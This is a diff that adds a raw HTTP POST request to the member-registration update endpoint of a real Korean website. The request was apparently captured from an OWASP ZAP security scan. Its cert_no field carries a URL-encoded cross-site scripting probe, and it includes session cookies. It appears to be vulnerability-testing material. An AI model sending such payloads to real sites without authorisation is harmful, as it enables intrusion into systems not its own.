@@ -1,0 +1,11 @@
+POST https://www.kims.re.kr/help/bbs/register_form_update.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 536
+Referer: https://www.kims.re.kr/help/bbs/register_form.php
+Cookie: PHPSESSID=prgi20bt1dldn0rr7n5uvo37e5; 2a0d2363701f23f8a75028924a3af643=MjEwLjExOS4xMTQuMjE%3D; 3cdd7a9cf69f036e38207467f8ed0082=MDVfMDQ%3D; 96b28b766b7e0699aa91c9ff3d890663=aHR0cHM6Ly93d3cua2ltcy5yZS5rcg%3D%3D; 7572559ca86e781ba8fe8073a0b725c6=ZW4%3D; f33d2ed86bd82d4c22123c9da444d8ab=MTU4NjEzMzM1OA%3D%3D; e1192aefb64683cc97abb83c71057733=MDJfMDg%3D
+Host: www.kims.re.kr
+
+w=&agree=1&agree2=1&cert_type=&cert_no=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&mb_sex=&mb_nick_default=&mb_nick=&mb_open_default=&mb_open=1&mb_1=&cp_info=&mb_4=&mb_7=&mb_8=&mb_hp=&mb_12=&mb_5=%EA%B8%B0%EC%97%85%ED%9A%8C%EC%9B%90&mb_id=ZAP&mb_password=ZAP&mb_password_re=ZAP&mb_1_1=ZAP&mb_1_2=ZAP&mb_1_3=ZAP&cp_name=ZAP&cp_ceo=ZAP&cp_zip=ZAP&cp_addr1=ZAP&cp_addr2=ZAP&cp_addr3=ZAP&cp_addr_jibeon=&mb_name=ZAP&old_email=&mb_email=ZAP&mb_2=ZAP&mb_3=ZAP&mb_9=%EB%8C%80%ED%95%99&mb_6=ZAP&mb_file=test_file.txt&mb_mailling=1&mb_sms=1
